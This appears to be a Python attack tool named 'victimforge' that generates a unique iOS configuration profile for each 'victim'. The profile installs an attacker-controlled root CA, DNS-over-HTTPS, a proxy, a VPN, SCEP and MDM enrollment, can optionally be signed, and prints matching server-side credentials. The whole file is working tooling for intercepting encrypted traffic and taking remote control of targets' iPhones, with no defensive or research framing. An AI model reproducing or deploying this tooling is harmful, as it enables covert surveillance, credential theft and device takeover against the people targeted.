#!/usr/bin/env python3
"""
victimforge.py — build a unique .mobileconfig per victim and optionally sign it.

usage:
  python3 victimforge.py --victim v001 --vps 203.0.113.10 --doh doh.acme.tld \
      --proxy proxy-abc.onrender.com --proxy-port 8080 \
      --mdm mdm.acme.tld --apns-topic com.apple.mgmt.External.1234-... \
      --ca ca-cert.pem [--sign signer.pem --signkey signer.key]
"""
import argparse, base64, hashlib, os, subprocess, sys, uuid
from pathlib import Path

TMPL = Path("templates/profile.mobileconfig.tmpl")

def uuid4():
    return str(uuid.uuid4()).upper()

def der_b64(pem_path: str) -> str:
    """PEM -> base64 of DER (what <data> expects)."""
    out = subprocess.run(
        ["openssl", "x509", "-in", pem_path, "-outform", "DER"],
        check=True, capture_output=True).stdout
    return "\n".join(base64.encodebytes(out).decode().split())

def vpn_password(victim: str) -> str:
    """Deterministic per-victim password so strongSwan secrets stay in sync."""
    salt = os.environ.get("VPN_SECRET_SALT", "")
    if not salt or salt == "change-this-salt":
        # The salt is what makes these device passwords unguessable; deriving
        # them with the well-known default would hand out predictable secrets.
        sys.exit(
            "VPN_SECRET_SALT is not set (or still the default 'change-this-salt') "
            "- export a long random value before generating a profile."
        )
    h = hashlib.sha256(f"{salt}:{victim}".encode()).digest()
    return base64.b32encode(h[:12]).decode().rstrip("=")

def build(args) -> Path:
    tmpl = TMPL.read_text()
    m = {
        "VICTIM_ID":       args.victim,
        "UUID_ROOT":       uuid4(),
        "UUID_CA":         uuid4(),
        "UUID_DNS":        uuid4(),
        "UUID_PROXY":      uuid4(),
        "UUID_VPN":        uuid4(),
        "UUID_SCEP":       uuid4(),
        "UUID_MDM":        uuid4(),
        "CA_DER_B64":      der_b64(args.ca),
        "DOH_HOST":        args.doh,
        "VPS_IP":          args.vps,
        "PROXY_HOST":      args.proxy,
        "PROXY_PORT":      str(args.proxy_port),
        "PROXY_USER":      args.victim,
        "PROXY_PASS":      vpn_password(args.victim + ":proxy"),
        "VPN_PASS":        vpn_password(args.victim),
        "SCEP_CHALLENGE":  vpn_password(args.victim + ":scep"),
        "MDM_HOST":        args.mdm,
        "APNS_TOPIC":      args.apns_topic,
    }
    for k, v in m.items():
        tmpl = tmpl.replace("{{%s}}" % k, v)

    outdir = Path("profiles"); outdir.mkdir(exist_ok=True)
    out = outdir / f"{args.victim}.mobileconfig"
    out.write_text(tmpl)

    # sanity check: must parse as a plist (plutil on macOS, plistlib elsewhere)
    try:
        subprocess.run(["plutil", "-lint", str(out)], check=True)
    except (FileNotFoundError, OSError):
        # plutil is macOS-only; fall back to Python's plistlib
        import plistlib
        try:
            with open(out, "rb") as _fh:
                plistlib.load(_fh)
        except Exception as exc:
            print(f"generated profile is not a valid plist: {exc}", file=sys.stderr)
            raise

    if args.sign:
        signed = outdir / f"{args.victim}.signed.mobileconfig"
        subprocess.run([
            "openssl", "cms", "-sign", "-nodetach",
            "-signer", args.sign, "-inkey", args.signkey,
            "-in", str(out), "-out", str(signed), "-outform", "DER",
        ], check=True)
        out = signed

    # drop ready-to-paste strongSwan / SCEP lines
    print(f"{args.victim} : EAP \"{m['VPN_PASS']}\"")
    print(f"{args.victim} : SCEP \"{m['SCEP_CHALLENGE']}\"")
    return out

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--victim", required=True)
    p.add_argument("--vps", required=True, help="VPN gateway IP")
    p.add_argument("--doh", required=True, help="DoH hostname (public TLS cert!)")
    p.add_argument("--proxy", required=True, help="Render proxy hostname")
    p.add_argument("--proxy-port", type=int, default=8080)
    p.add_argument("--mdm", default="mdm.acme.tld")
    p.add_argument("--apns-topic", default="com.apple.mgmt.External.REPLACE-ME")
    p.add_argument("--ca", default="ca-cert.pem")
    p.add_argument("--sign", help="CMS signer cert (PEM)")
    p.add_argument("--signkey", help="CMS signer key (PEM)")
    print("wrote:", build(p.parse_args()))